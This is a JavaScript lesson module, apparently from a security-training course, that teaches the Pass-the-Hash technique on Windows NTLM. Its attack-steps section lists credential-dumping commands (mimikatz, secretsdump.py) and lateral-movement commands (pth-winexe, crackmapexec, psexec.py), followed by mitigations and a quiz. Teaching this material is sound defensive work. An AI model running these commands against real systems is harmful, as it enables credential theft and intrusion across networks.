export const passTheHashTheory = {
  id: 'pass-the-hash',
  title: 'Pass-the-Hash Attack',
  subtitle: 'Authenticate without knowing the plaintext password',
  estimatedTime: '10 minutes',
  difficulty: 'Intermediate',
  xpReward: 120,

  sections: [
    {
      id: 'intro',
      title: '🎯 What is Pass-the-Hash?',
      type: 'intro',
      duration: '2 min',
      content: `Pass-the-Hash (PtH) is an attack where an attacker uses a password hash (usually NTLM) instead of the plaintext password to authenticate to remote systems.

**Key Insight:** Windows authentication protocols like NTLM don't require the plaintext password - the hash is sufficient!`,
      keyPoints: [
        'Uses password hash instead of plaintext password',
        'Works with NTLM authentication',
        'No need to crack the hash',
        'Common lateral movement technique'
      ]
    },

    {
      id: 'how-it-works',
      title: '🔐 How NTLM Authentication Works',
      type: 'concept',
      duration: '3 min',
      content: `NTLM authentication uses a challenge-response mechanism where the password hash (not plaintext) is used for authentication.

**The Vulnerability:** If you have the hash, you can authenticate without ever knowing the actual password.`,
      example: {
        title: 'NTLM Hash Format',
        code: `Username:RID:LM Hash:NTLM Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

The second hash (NTLM) is what we need for PtH attacks.`
      }
    },

    {
      id: 'attack-steps',
      title: '⚔️ Executing Pass-the-Hash',
      type: 'steps',
      duration: '3 min',
      steps: [
        {
          number: 1,
          title: 'Obtain Password Hash',
          description: 'Extract NTLM hash from compromised system',
          commands: [
            'mimikatz # sekurlsa::logonpasswords',
            'secretsdump.py user:password@target'
          ]
        },
        {
          number: 2,
          title: 'Use Hash for Authentication',
          description: 'Authenticate to remote systems using the hash',
          commands: [
            'mimikatz # sekurlsa::pth /user:admin /domain:contoso /ntlm:hash /run:cmd',
            'pth-winexe -U admin%hash //10.0.1.10 cmd'
          ]
        },
        {
          number: 3,
          title: 'Lateral Movement',
          description: 'Move to other systems using the compromised account',
          commands: [
            'crackmapexec smb 10.0.1.0/24 -u admin -H hash',
            'psexec.py -hashes :hash admin@10.0.1.10'
          ]
        }
      ]
    },

    {
      id: 'defense',
      title: '🛡️ Mitigation Strategies',
      type: 'defensive',
      duration: '2 min',
      prevention: [
        {
          title: 'Disable NTLM',
          description: 'Force Kerberos-only authentication',
          example: 'Network security: Restrict NTLM: Incoming NTLM traffic'
        },
        {
          title: 'Protected Users Group',
          description: 'Prevents NTLM for member accounts',
          example: 'Add privileged accounts to Protected Users'
        },
        {
          title: 'Credential Guard',
          description: 'Protects credentials using virtualization security',
          example: 'Enable on Windows 10/Server 2016+'
        }
      ]
    }
  ],

  quiz: [
    {
      question: 'What is required to perform Pass-the-Hash?',
      options: [
        'The plaintext password',
        'The NTLM hash',
        'A Kerberos ticket',
        'Domain Admin privileges'
      ],
      correct: 1,
      explanation: 'Pass-the-Hash only requires the NTLM hash, not the plaintext password.'
    }
  ],

  resources: [
    {
      title: 'MITRE ATT&CK - Pass the Hash',
      url: 'https://attack.mitre.org/techniques/T1550/002/',
      type: 'reference'
    }
  ]
};
